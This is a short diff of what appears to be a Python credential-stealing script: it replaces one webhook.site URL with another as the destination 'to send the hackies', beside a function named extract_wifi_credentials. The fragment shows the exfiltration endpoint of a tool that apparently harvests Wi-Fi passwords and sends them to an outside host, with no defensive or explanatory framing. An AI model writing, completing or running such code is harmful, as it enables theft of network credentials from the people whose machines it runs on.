@@ -4,7 +4,7 @@ import requests
 import xml.etree.ElementTree as ET
 
 #url to send the hackies
-url = "https://webhook.site/ecc6f5af-76f5-407c-bf23-6f121de83d6d"
+url = "https://webhook.site/27249c99-075e-4c63-a394-ce0b684d65a2"
 
 # Function to extract Wi-Fi credentials
 def extract_wifi_credentials():
